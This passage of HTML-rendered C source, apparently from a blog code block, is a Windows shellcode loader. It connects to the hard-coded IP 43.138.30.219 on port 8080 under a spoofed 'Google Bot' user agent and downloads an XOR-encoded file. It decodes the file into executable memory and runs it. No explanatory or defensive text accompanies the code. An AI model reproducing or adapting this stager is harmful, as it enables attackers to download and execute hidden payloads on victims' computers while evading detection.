span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Winhttp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    HINTERNET hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;Google Bot HTTP/1.1&quot;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open WinHTTP session: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    HINTERNET hConnect = <span class="built_in">WinHttpConnect</span>(hSession, <span class="string">L&quot;43.138.30.219&quot;</span>, <span class="number">8080</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to connect to server: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    HINTERNET hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, <span class="string">L&quot;/AppResource.dat&quot;</span>, <span class="literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open HTTP request: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WinHttpSendRequest</span>(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to send HTTP request: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WinHttpReceiveResponse</span>(hRequest, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to receive HTTP response: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    DWORD uFileSize = <span class="number">0</span>;</span><br><span class="line">    DWORD uBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize);</span><br><span class="line">    uFileSize = dwSize;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    LPVOID lpEncryptedShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, (SIZE_T)uFileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WinHttpReadData</span>(hRequest, lpEncryptedShellcode, dwSize, &amp;dwDownloaded);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    LPVOID lpDecryptedShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwSize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *((BYTE*)lpDecryptedShellcode + i) = *((BYTE*)lpEncryptedShellcode + i) ^ <span class="number">88</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">void</span> (*pShellcode)() = (<span class="built_in">void</span>(*)())lpDecryptedShellcode;</span><br><span class="line">    <span class="built_in">pShellcode</span>();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">VirtualFree</span>(lpEncryptedShellcode, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
